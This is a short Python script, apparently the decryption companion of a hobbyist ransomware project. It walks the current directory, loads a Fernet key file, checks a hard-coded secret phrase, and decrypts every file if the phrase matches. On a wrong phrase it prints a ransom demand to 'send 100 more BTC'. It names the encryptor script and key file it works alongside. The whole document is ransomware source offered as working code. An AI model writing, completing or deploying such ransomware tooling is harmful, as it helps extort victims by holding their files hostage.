#import packages

import os
from cryptography.fernet import Fernet

#let's find the files to encrypt and put them in a list

files = []

for file in os.listdir():
	if file == "dracula.py" or file == "thekey.key" or file == "decrypt.py": #exclude these files
		continue
	if os.path.isfile(file): #exclude directories
		files.append(file)

with open("thekey.key", "rb") as key:
	secretkey = key.read()

secretphrase = "rachelgreen"

user_phrase = input ("Enter the secret phrase to decrypt your files\n")

if user_phrase == secretphrase:
	for file in files:
		with open(file, "rb") as thefile:
			contents = thefile.read() #save contents of the files in contents
			contents_decrypted = Fernet(secretkey).decrypt(contents) #decrypt content
		with open(file, "wb") as thefile: #write encrypted  content to the file
			thefile.write(contents_decrypted)
	print("Congrats, your files have been decrypted")
else:
	print("Ooops. Wrong secret phase. Send 100 more BTC. Have a good day!")
